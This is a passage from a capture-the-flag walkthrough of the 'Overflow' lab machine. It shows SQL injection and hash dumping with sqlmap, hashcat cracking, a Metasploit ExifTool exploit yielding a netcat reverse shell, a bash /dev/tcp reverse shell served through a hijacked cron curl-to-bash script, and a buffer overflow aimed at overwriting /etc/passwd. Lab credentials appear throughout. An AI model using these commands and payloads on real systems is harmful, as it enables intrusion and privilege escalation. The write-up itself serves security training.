web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL &gt;= 5.0.12</code></pre>
</doc-codeblock></div>
<p>Yes! It is vulnerable to SQL injection. We see that the database is MySQL so we can add <code v-pre>-dbms=mysql</code> to our next queries. Lets enumerate this databases.</p>
<p>Databases:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql --dbs

[09:48:37] [INFO] fetching database names
available databases [4]:
[*] cmsmsdb
[*] information_schema
[*] logs
[*] Overflow</code></pre>
</doc-codeblock></div>
<p>DB-&gt;Overflow:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D Overflow --tables --dump

Database: Overflow
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| c71d60439ed5590b3c5e99d95ed48165 | admin    |
+----------------------------------+----------+</code></pre>
</doc-codeblock></div>
<p>I could not crack this password! Lets move on.</p>
<p>DB-&gt;cmsmsdb:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb --tables

Database: cmsmsdb                                                                                                                              [10/581]
[47 tables]                                                                                                                                            
+-----------------------------+                                                                                                                        
| cms_additional_users        |                                                                                                                        
| cms_additional_users_seq    |                                                                                                                        
| cms_admin_bookmarks         |                                                                                                                        
| cms_admin_bookmarks_seq     |                                                                                                                        
| cms_adminlog                |                                                                                                                        
| cms_content                 |                                                                                                                        
| cms_content_props           |                                                                                                                        
| cms_content_props_seq       |                                                                                                                        
| cms_content_seq             |
| cms_event_handler_seq       |
| cms_event_handlers          |
| cms_events                  |
| cms_events_seq              |
| cms_group_perms             |
| cms_group_perms_seq         |
| cms_groups                  |
| cms_groups_seq              |
| cms_layout_design_cssassoc  |
| cms_layout_design_tplassoc  |
| cms_layout_designs          |
| cms_layout_stylesheets      |
| cms_layout_templates        |
| cms_layout_tpl_addusers     |
| cms_layout_tpl_categories   |
| cms_layout_tpl_type         |
| cms_locks                   |
| cms_mod_cmsjobmgr           |
| cms_mod_filepicker_profiles |
| cms_module_deps             |
| cms_module_search_index     |
| cms_module_search_items     |
| cms_module_search_items_seq |
| cms_module_search_words     |
| cms_module_smarty_plugins   |
| cms_module_templates        |
| cms_modules                 |
| cms_permissions             |
| cms_permissions_seq         |
| cms_routes                  |
| cms_siteprefs               |
| cms_user_groups             |
| cms_userplugins             |
| cms_userplugins_seq         |
| cms_userprefs               |
| cms_users                   |
| cms_users_seq               |
| cms_version                 |
+-----------------------------+</code></pre>
</doc-codeblock></div>
<p>DB-&gt;cmsmsdb Table-&gt;cms_users:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb -T cms_users -C username,password,email --dump

Database: cmsmsdb
Table: cms_users
[2 entries]
+----------+----------------------------------+--------------------+
| username | password                         | email              |
+----------+----------------------------------+--------------------+
| admin    | c6c6b9310e0e6f3eb3ffeb2baff12fdd | admin@overflow.htb |
| editor   | e3d748d58b58657bfa4dffe2def0b1c7 | &lt;blank&gt;            |
+----------+----------------------------------+--------------------+</code></pre>
</doc-codeblock></div>
<p>Ok, this looks promising...
Doing a little bit of research, this hashes are encrypted with salt and it can be found in the <code v-pre>cms_siteprefs</code> table under the <code v-pre>sitemask</code> column:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">sqlmap -r logs.req --batch -dbms=mysql -D cmsmsdb -T cms_siteprefs

...[snip]...

| sitemask | 6c2d17f37e226486

...[snip]...</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="cracking-users-hashes">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cracking-users-hashes">#</doc-anchor-trigger>
        <span>Cracking users hashes</span>
    </h3>
</doc-anchor-target>
<p>In order to use hashcat we need to add the hashes into a file following th <code v-pre>hash:salt</code> format:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">c6c6b9310e0e6f3eb3ffeb2baff12fdd:6c2d17f37e226486
e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486</code></pre>
</doc-codeblock></div>
<p>Lets run hashcat against the hashes:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt

e3d748d58b58657bfa4dffe2def0b1c7:6c2d17f37e226486:alpha!@#$%bravo</code></pre>
</doc-codeblock></div>
<p>Hashcat only cracked the <code v-pre>editor</code> password <code v-pre>alpha!@#$%bravo</code>.</p>
<doc-anchor-target id="cms-made-simple">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cms-made-simple">#</doc-anchor-trigger>
        <span>CMS Made Simple</span>
    </h3>
</doc-anchor-target>
<p>Back to the CMS page <a href="http://overflow.htb/admin_cms_panel/admin/login.php">http://overflow.htb/admin_cms_panel/admin/login.php</a> we can use this credentials to login!
We can see at the bottom of the page the version <code v-pre>CMS Made Simple 2.2.8 Flin Flon</code>. I kept browsing and enumerating the pages and saw an hint to another page:
<figure class="content-center">
    <img src="images/image10.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Adding the new hostname to our hosts file we can access it.
There is a login page and using the same credentials from <code v-pre>editor</code> we successfully login to the web app.</p>
<doc-anchor-target id="devbuild">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#devbuild">#</doc-anchor-trigger>
        <span>Devbuild</span>
    </h3>
</doc-anchor-target>
<p>Poking around on the website, we find an upload function when we click on our account. I tried uploading a php webshell, but it failed due to unsupported filetype.
<figure class="content-center">
    <img src="images/image11.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Another interesting thing was the server response when we upload a file:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">HTTP/1.1 302 Moved Temporarily
Date: Tue, 22 Mar 2022 02:40:21 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: ./index.php?upload=0
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 2391

ExifTool Version Number         : 11.92
File Name                       : 62393716a29472.00671524.jpg
Directory                       : ../../assets/data/upliid
File Size                       : 114 kB
File Modification Date/Time     : 2022:03:22 08:10:22+05:30
File Access Date/Time           : 2022:03:22 08:10:21+05:30
File Inode Change Date/Time     : 2022:03:22 08:10:22+05:30
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg

...[snip]...</code></pre>
</doc-codeblock></div>
<p>It is using exiftool! Doing a little more research on <em>exiftool</em> - specially version 11.92, I found a <a href="https://www.exploit-db.com/download/49881">CVE-2021–22204</a>. Metasploit has a module for the exploit, which makes this super convenient.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">msf6 &gt; use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; set LHOST 10.10.14.3
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; options

Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.jpg          yes       Output file


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   JPEG file

msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) &gt; run

[+] msf.jpg stored at /root/.msf4/local/msf.jpg</code></pre>
</doc-codeblock></div>
<p>Lets start a netcat listener on port 4444 and upload the generated jpeg file.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.119] 38406

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
www-data@overflow:~/devbuild-job/home/profile$</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="shell-as-www-data">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#shell-as-www-data">#</doc-anchor-trigger>
        <span>Shell as www-data</span>
    </h2>
</doc-anchor-target>
<p>Looking through the web folders we find some credentials.
<code v-pre>~/devbuild-job/config/db.php</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">www-data@overflow:~/devbuild-job/config$ cat db.php 
&lt;?php
$lnk = mysqli_connect(&quot;localhost&quot;,&quot;dev_manager&quot;, &quot;3RyxKah_hBf*V6ja&quot;,&quot;develop&quot;);
?&gt;</code></pre>
</doc-codeblock></div>
<p>And</p>
<p><code v-pre>~/html/config/db.php</code></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">www-data@overflow:~/html/config$ cat db.php 
&lt;?php 

#define('DB_Server', 'localhost');
#define('DB_Username', 'root');
#define('DB_Password','root');
#define('DB_Name', 'Overflow');

$lnk = mysqli_connect(&quot;localhost&quot;,&quot;developer&quot;, &quot;sh@tim@n&quot;,&quot;Overflow&quot;);
$db = mysqli_select_db($lnk,&quot;Overflow&quot;);

if($db == false){
    dir('Cannot Connect to Database');
}

?&gt;
</code></pre>
</doc-codeblock></div>
<p>We need to escalate to a user, preferable with shell. Lets look at the <code v-pre>/etc/passwd</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">www-data@overflow:~/devbuild-job/config$ cat /etc/passwd | grep &quot;sh$&quot;
root:x:0:0:root:/root:/bin/bash
tester:x:1000:1000:tester,,,:/home/tester:/bin/bash
developer:x:1001:1001::/home/developer:/bin/sh</code></pre>
</doc-codeblock></div>
<p>We have a user called <code v-pre>developer</code>, and we also have a database password for <code v-pre>developer</code>. Lets use SSH with these credentials.</p>
<doc-anchor-target id="ssh-as-developer">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#ssh-as-developer">#</doc-anchor-trigger>
        <span>SSH as Developer</span>
    </h2>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ ssh developer@overflow.htb
developer@overflow.htbs password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 22 08:28:11 IST 2022

  System load:  0.0               Processes:           169
  Usage of /:   45.2% of 5.84GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 10.10.11.119
  Swap usage:   0%


0 updates can be applied immediately.


-sh: 28: set: Illegal option -o history
-sh: 1: set: Illegal option -o history

$ pwd
/home/developer
$ ls -la
total 28
drwxr-xr-x 5 developer root      4096 Sep 28 04:42 .
drwxr-xr-x 4 root      root      4096 May 26  2021 ..
lrwxrwxrwx 1 root      root         9 Sep 27 22:49 .bash_history -&gt; /dev/null
-rw-r--r-- 1 developer root      3106 May 28  2021 .bashrc
drwx------ 2 developer developer 4096 May 26  2021 .cache
drwx------ 4 developer developer 4096 May 28  2021 .gnupg
-rw-r--r-- 1 root      root        15 May 30  2021 .profile
drwx------ 2 developer developer 4096 Sep 28 04:44 .ssh
</code></pre>
</doc-codeblock></div>
<p>We still don&#x27;t have <code v-pre>user.txt</code> flag! It is in the <code v-pre>/home/tester</code> directory. So we need to find a way to escalate to <code v-pre>tester</code> user.</p>
<p>Enumerating the machine, we see some interesting files owned by <code v-pre>tester</code> in <code v-pre>/opt</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">developer@overflow:/opt$ ls -la
total 16
drwxr-xr-x   3 root   root   4096 Sep 17  2021 .
drwxr-xr-x  25 root   root   4096 Jan 26 21:08 ..
-rwxr-x---+  1 tester tester  109 May 28  2021 commontask.sh
drwxr-x---+  2 root   root   4096 Sep 17  2021 file_encrypt

developer@overflow:/opt$ cat commontask.sh 
#!/bin/bash

#make sure its running every minute.

bash &lt; &lt;(curl -s http://taskmanage.overflow.htb/task.sh)</code></pre>
</doc-codeblock></div>
<p>The problem is, the <code v-pre>taskmanage</code> subdomain does not exist. We can hijack the request doing the following:</p>
<ul>
<li>Create <code v-pre>task.sh</code> on ur attacking machine that when ran it creates a reverse connection to us</li>
<li>Spin a python web server on port 80</li>
<li>Set our attacking IP to resolve <code v-pre>taskmanage.overflow.htb</code> on overflow&#x27;s host file</li>
<li>Start netcat listener and wait a minute for tester to connect <span class="docs-emoji">&#x1F600;</span></li>
</ul>
<p>First I created the <code v-pre>task.sh</code> in my machine with a bash reverse shell and started a Python web server on port 80:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ cat task.sh                                                                               
bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1

$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
</doc-codeblock></div>
<p>Also in another terminal started a netcat listener on port 4444.</p>
<p>In Overflow machine we can add the host entry <code v-pre>taskmanage.overflow.htb</code> pointing to our machine:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">echo &quot;10.10.14.3 taskmanage.overflow.htb&quot; &gt;&gt; /etc/hosts</code></pre>
</doc-codeblock></div>
<p>After a minute or two we get a hit in our Python web server and a connection back to our netcat listener!</p>
<doc-anchor-target id="shell-as-tester">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#shell-as-tester">#</doc-anchor-trigger>
        <span>Shell as tester</span>
    </h2>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.119] 38718
bash: cannot set terminal process group (6059): Inappropriate ioctl for device
bash: no job control in this shell
tester@overflow:~$</code></pre>
</doc-codeblock></div>
<p>Lets upgrade the tty generating SSH keys:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">tester@overflow:~/.ssh$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/tester/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/tester/.ssh/id_rsa.
Your public key has been saved in /home/tester/.ssh/id_rsa.pub.

tester@overflow:~/.ssh$ cp id_rsa.pub authorized_keys
tester@overflow:~/.ssh$ chmod 600 ./authorized_keys
tester@overflow:~/.ssh$ cat id_rsa</code></pre>
</doc-codeblock></div>
<p>Create a file with the <code v-pre>id_rsa</code> contents in attacker machine and use it to SSH in:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ nano tester.idrsa
$ chmod 600 tester.idrsa
$ ssh -i tester.idrsa tester@overflow.htb</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="file-encrypt">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#file-encrypt">#</doc-anchor-trigger>
        <span>File encrypt</span>
    </h3>
</doc-anchor-target>
<p>Going back to the <code v-pre>/opt</code> directory we can access the <code v-pre>file_encrypt</code> folder, owned by root but with ACLS to the <code v-pre>tester</code> user, and read the <code v-pre>README.md</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">tester@overflow:/opt/file_encrypt$ cat README.md 
Our couple of reports have been leaked to avoid this. We have created a tool to encrypt your reports. Please check the pin feature of this application and report any issue that you get as this application is still in development. We have modified the tool a little bit that you can only use the pin feature now. The encrypt function is there but you can't use it now.The PIN should be in your inbox

tester@overflow:/opt/file_encrypt$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: 12345
Wrong Pin</code></pre>
</doc-codeblock></div>
<p>Given the name of the machine, I thought this would be a buffer overflow. So I tried passing varying lengths and characters to the PIN field but just said &quot;Wrong Pin&quot;. So, let’s bring the file back to our machine so we can reverse it.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">scp -i tester.idrsa tester@overflow.htb:/opt/file_encrypt/file_encrypt ./file_encrypt
file_encrypt                                            100%   12KB  37.4KB/s   00:00</code></pre>
</doc-codeblock></div>
<p>First I check the file security flags:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ checksec file_encrypt 
[*] '/home/caue/htb/overflow/reverse/file_encrypt'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre>
</doc-codeblock></div>
<p>Lets open in Ghidra and have a look at the functions!
Starting with the <code v-pre>check_pin</code> function, maybe we can reverse the code to determine a valid PIN.
<figure class="content-center">
    <img src="images/image12.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>The code looks fairly straightfoward. The PIN we enter is stored in the <code v-pre>local_18</code> variable and then compared to <code v-pre>local_14</code>. If they match, we have the correct PIN.
<code v-pre>local_14</code> is generated through the <code v-pre>random()</code> function. Let’s look at it:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">random()</div>
<pre class="language-c"><code v-pre class="language-c">long random(void)

{
  uint in_stack_00000004;
  uint local_c;
  int local_8;
  
  local_c = 0x6b8b4567;
  for (local_8 = 0; local_8 &lt; 10; local_8 = local_8 + 1) {
    local_c = local_c * 0x59 + 0x14;
  }
  return local_c ^ in_stack_00000004;
}</code></pre>
</doc-codeblock></div>
<p>This is the function that creates the PIN. In theory, we should be able to replicate this code elsewhere and generate a working PIN. We’ll do this in python and run it on the server.
There are a few gotcha’s in this function. First, was not able to decompile the first variable correctly, leaving us with <code v-pre>in_stack_00000004</code>. We need to identify this value since we will be xor’ing it with the <code v-pre>local_c</code> value below.</p>
<p>To get this value, we use gdb to set a breakpoint at the function <code v-pre>return</code>, and then we examine the value in memory at that location:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ gdb file_encrypt

(gdb) disas random
Dump of assembler code for function random:
   0x0000081d &lt;+0&gt;:     push   %ebp
   0x0000081e &lt;+1&gt;:     mov    %esp,%ebp
   0x00000820 &lt;+3&gt;:     sub    $0x10,%esp
   0x00000823 &lt;+6&gt;:     call   0xb90 &lt;__x86.get_pc_thunk.ax&gt;
   0x00000828 &lt;+11&gt;:    add    $0x2778,%eax
   0x0000082d &lt;+16&gt;:    movl   $0x6b8b4567,-0x8(%ebp)
   0x00000834 &lt;+23&gt;:    movl   $0x0,-0x4(%ebp)
   0x0000083b &lt;+30&gt;:    jmp    0x84d &lt;random+48&gt;
   0x0000083d &lt;+32&gt;:    mov    -0x8(%ebp),%eax
   0x00000840 &lt;+35&gt;:    imul   $0x59,%eax,%eax
   0x00000843 &lt;+38&gt;:    add    $0x14,%eax
   0x00000846 &lt;+41&gt;:    mov    %eax,-0x8(%ebp)
   0x00000849 &lt;+44&gt;:    addl   $0x1,-0x4(%ebp)
   0x0000084d &lt;+48&gt;:    cmpl   $0x9,-0x4(%ebp)
   0x00000851 &lt;+52&gt;:    jle    0x83d &lt;random+32&gt;
   0x00000853 &lt;+54&gt;:    mov    -0x8(%ebp),%eax
   0x00000856 &lt;+57&gt;:    xor    0x8(%ebp),%eax
   0x00000859 &lt;+60&gt;:    leave  
   0x0000085a &lt;+61&gt;:    ret    
End of assembler dump.</code></pre>
</doc-codeblock></div>
<p>Here we disassemble the <code v-pre>random()</code> function. Next we set a breakpoint at offset 57, where we xor our values. The end result of the xor operation is returned by the function.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">(gdb) b * random+57
Breakpoint 1 at 0x856</code></pre>
</doc-codeblock></div>
<p>Now we run the program until the breakpoint is reached. Once there, we can examine the value at the memory location, which would be <code v-pre>0x8(%ebp)</code> or, written differently, <code v-pre>ebp+8</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">(gdb) r
Starting program: /home/caue/htb/overflow/reverse/file_encrypt 

Breakpoint 1, 0x56555856 in random ()
(gdb) x /10x $ebp +8
0xffffcf40:     0x6b8b4567      0x56557fa0      0x00000001      0x56555ac7
0xffffcf50:     0x00000001      0xf7fdc480      0x00000000      0xf7df18ce
0xffffcf60:     0xf7fa53fc      0x56557fa0</code></pre>
</doc-codeblock></div>
<p>The value at that address is the same value passed to <code v-pre>local_c</code>. So essentially in our code, we’ll need to xor the final <code v-pre>local_c</code> value against the original <code v-pre>local_c</code> value.</p>
<p>The other issue is that the return value from the random function is a type long integer. Because our input value in <code v-pre>check_pin</code> is a signed <code v-pre>int</code> type, we need to cast the return value from <code v-pre>random</code> as a signed <code v-pre>int</code>, otherwise the values will never match. Python3 does not differentiate between <code v-pre>long</code> and <code v-pre>int</code> values natively, so to do the conversion we need to include the <code v-pre>ctypes</code> import in our code.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">generate_pin.py</div>
<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/python3

import ctypes

local_c_initial = 0x6b8b4567
local_c = 0x6b8b4567
local_8 = 0

while (local_8 &lt;10):
        local_c = local_c * 0x59 + 0x14
        local_8 = local_8 + 1

PIN = ctypes.c_int(local_c ^ local_c_initial).value
print(&quot;The PIN code is: &quot;, PIN)</code></pre>
</doc-codeblock></div>
<p>Running the python script generates a PIN code:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python3 generate_pin.py
The PIN code is:  -202976456</code></pre>
</doc-codeblock></div>
<p>And the PIN is valid! We’re presented with a name prompt and the program exited with a thank you message.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">tester@overflow:/opt/file_encrypt$ ./file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: testing nameeeeee
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb</code></pre>
</doc-codeblock></div>
<p>Back to Ghidra we look at the <code v-pre>check_pin</code> function again and spot where the <code v-pre>name:</code> is being used and stored. It is stored in <code v-pre>local_2c</code> variable which is programmed to allocate 20 bytes only, here is our buffer overflow!
<figure class="content-center">
    <img src="images/image13.png" alt="" />
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>We can confirm running the binary in gdb and passing a large amount of characters when it asks for a &quot;name&quot;:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">$ gdb file_encrypt

(gdb) r
Starting program: /home/caue/htb/overflow/reverse/file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()</code></pre>
</doc-codeblock></div>
<p>The next step is to find the offset for the EIP register. If we’re able to control the values placed in the register, we can take control of the programs operational flow and redirect it to our advantage.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</code></pre>
</doc-codeblock></div>
<p>Using pattern_create, we generated a string of 300 characters. We’ll input it using gdb and then extract the EIP value.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/caue/htb/overflow/reverse/file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb

Program received signal SIGSEGV, Segmentation fault.
0x35624134 in ?? ()</code></pre>
</doc-codeblock></div>
<p>EIP was overwritten with <code v-pre>0x35624134</code>.
Using <code v-pre>msf_pattern_offset</code> we can identify the overflow offset at 44.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ /usr/bin/msf-pattern_offset -l 300 -q 0x35624134
[*] Exact match at offset 44</code></pre>
</doc-codeblock></div>
<p>Now that we know the offset, we’re going to attempt to route the program execution to the encrypt function. To get the address of the function, we run the program in gdb, issue a ctrl-c and dissassemble the function.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">(gdb) r                                                                                                                                                
The program being debugged has been started already.                                                                                                   
Start it from the beginning? (y or n) y                                                                                                                
Starting program: /home/caue/htb/overflow/reverse/file_encrypt                                                                                         
This is the code 1804289383. Enter the Pin: -202976456                                                                                                 
name: ^C                                                                                                                                               
Program received signal SIGINT, Interrupt.                                                                                                             
0xf7fc9559 in __kernel_vsyscall ()                                                                                                                     
(gdb) disas encrypt                                                                                                                                    
Dump of assembler code for function encrypt:                                                                                                           
   0x5655585b &lt;+0&gt;:     push   %ebp                                                                                                                    
   0x5655585c &lt;+1&gt;:     mov    %esp,%ebp                                                                                                               
   0x5655585e &lt;+3&gt;:     push   %ebx                                                                                                                    
   0x5655585f &lt;+4&gt;:     sub    $0x94,%esp                                                                                                              
   0x56555865 &lt;+10&gt;:    call   0x56555720 &lt;__x86.get_pc_thunk.bx&gt;                                                                                      
   0x5655586a &lt;+15&gt;:    add    $0x2736,%ebx                                                                                                            
   0x56555870 &lt;+21&gt;:    movl   $0x0,-0x80(%ebp)                                                                                                        
   0x56555877 &lt;+28&gt;:    movl   $0x0,-0x7c(%ebp)                                                                                                        
   0x5655587e &lt;+35&gt;:    movl   $0x0,-0x78(%ebp)                                                                                                        
   0x56555885 &lt;+42&gt;:    movl   $0x0,-0x74(%ebp)                                                                                                        
   0x5655588c &lt;+49&gt;:    movl   $0x0,-0x70(%ebp)
   0x56555893 &lt;+56&gt;:    movl   $0x0,-0x94(%ebp)</code></pre>
</doc-codeblock></div>
<p>The function starts at <code v-pre>0x5655585b</code>.
Now we can add that to our buffer overflow to overwrite EIP and force us to the encrypt function.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ python -c &quot;print('\x41' * 44 + '\x5b\x58\x55\x56')&quot;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/caue/htb/overflow/reverse/file_encrypt 
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb
Enter Input File:</code></pre>
</doc-codeblock></div>
<p>Yes! It is working, and now is asking for the &quot;Input File&quot;.
Going back into Ghidra, we take a closer look at the encrypt function. The program’s purpose is to take a file and encrypt it in a new location. It does this by reading the file and XOR&#x27;ing it with <code v-pre>0x9b</code>.</p>
<p>Our plan is to create a copy of <code v-pre>/etc/passwd</code> and add a new root user. We’ll then use the program to encrypt and overwrite the system <code v-pre>/etc/passwd</code> with our modified copy.</p>
<p>We will manually encrypt our modified passwd file first prior to passing it through the program. An encrypted value XOR’ed by the same key (0x9b) should give us the original cleartext <code v-pre>/etc/passwd</code>. In other words, the encryption program will actually decrypt our passwd file when it overwrites <code v-pre>/etc/passwd</code>.</p>
